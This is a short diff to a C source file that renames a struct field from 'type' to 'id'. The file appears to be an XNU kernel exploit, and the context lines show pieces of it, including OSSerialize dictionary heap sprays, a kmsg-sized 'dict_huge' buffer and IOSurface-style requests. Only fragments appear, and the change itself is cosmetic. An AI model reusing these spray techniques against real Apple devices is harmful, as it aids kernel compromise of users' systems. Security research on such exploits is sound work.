@@ -417,7 +417,7 @@ int main(void)
         {
             mach_vm_address_t addr1;
             mach_vm_address_t addr2;
-            uint32_t type;
+            uint32_t id;
         } data;
     } surface;
     size = sizeof(surface);
@@ -442,7 +442,7 @@ int main(void)
     uint32_t dict_spray[DATA_SIZE / sizeof(uint32_t) + 7] =
     {
         // Some header or something
-        surface.data.type,
+        surface.data.id,
         0x0,
 
         kOSSerializeMagic,
@@ -513,7 +513,7 @@ int main(void)
     uint32_t request[] =
     {
         // Same header
-        surface.data.type,
+        surface.data.id,
         0x0,
 
         0x0, // Placeholder
@@ -635,7 +635,7 @@ after:;
     if(ret != KERN_SUCCESS) goto out;
 
     memset(dict_huge, 0, kmsg_size + 7 * sizeof(uint32_t));
-    dict_huge[                               0] = surface.data.type;
+    dict_huge[                               0] = surface.data.id;
     dict_huge[                               2] = kOSSerializeMagic;
     dict_huge[                               3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
     dict_huge[                               4] = kOSSerializeString | (kmsg_size - 1);
@@ -799,7 +799,7 @@ after:;
     uint32_t dict_array[] =
     {
         // Ye olde header
-        surface.data.type,
+        surface.data.id,
         0x0,
 
         kOSSerializeMagic,
